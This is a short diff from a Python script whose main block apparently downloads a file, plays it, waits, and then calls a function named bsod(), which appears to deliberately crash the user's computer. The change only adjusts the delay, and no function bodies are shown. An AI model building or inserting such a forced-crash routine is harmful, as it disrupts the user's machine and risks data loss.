@@ -24,6 +24,6 @@ def play():
 if __name__ == '__main__':
     getfile()
     play()
-    sleep(11)
+    sleep(10.5)
     bsod()
     
